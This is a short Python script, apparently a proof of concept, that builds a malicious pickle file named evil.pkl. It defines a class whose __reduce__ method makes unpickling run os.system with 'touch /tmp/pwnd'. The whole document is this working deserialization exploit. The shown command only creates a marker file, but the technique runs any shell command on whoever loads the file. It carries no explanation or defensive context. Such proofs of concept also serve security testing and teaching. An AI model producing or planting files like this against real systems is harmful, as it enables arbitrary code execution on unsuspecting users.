import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return os.system, ("touch /tmp/pwnd",)


pickle_data = pickle.dumps(EvilPickle())
with open("evil.pkl", "wb") as file:
    file.write(pickle_data)
